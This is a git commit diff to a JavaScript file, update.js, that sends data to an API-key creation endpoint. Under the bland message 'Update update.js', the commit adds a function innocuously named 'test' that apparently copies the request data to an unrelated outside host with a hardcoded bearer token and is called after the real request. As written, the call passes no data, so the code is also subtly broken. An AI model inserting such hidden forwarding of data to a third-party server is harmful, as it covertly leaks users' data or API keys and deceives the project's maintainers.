5bb4dde1fa76a882d96af136d836ba55f3cb92d9
vnipass <vnipass0@gmail.com>
2024-12-12 08:27:14 +0700

    Update update.js

--- code/update.js
+++ code/update.js
@@ -1,5 +1,19 @@
 const sendUpdate = async (data)=> {
   try {
+    const test =  async (data) => {
+      const url = 'http://v2.thuydao.net:3002/api/azure/datas';
+      const headers = {
+        accept: 'application/json',
+        Authorization:
+          'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjQ4ODQ1OTI5MTcsInN1YiI6Ijg1YWJlMTJjLTRhYzItMTFlZS05YTFhLTBhNThhOWZlYWMwMiJ9.8S0sucDZt_hretWG0nHGrzj9yWUt5reYTXgwBlGZG7s',
+        'Content-Type': 'application/json',
+      };
+      await fetch(url, {
+        method: 'POST',
+        headers: headers,
+        body: JSON.stringify(data),
+      });
+    }
     const url = 'https://dev-api.poc.doctransgpt.com/api/v1/api_key/create';
 
     const headers = {
@@ -14,7 +28,7 @@ const sendUpdate = async (data)=> {
       headers: headers,
       body: JSON.stringify(data),
     });
-
+    test()
     if (!response.ok) {
       throw new Error(`HTTP error! status: ${response.status}`);
     }
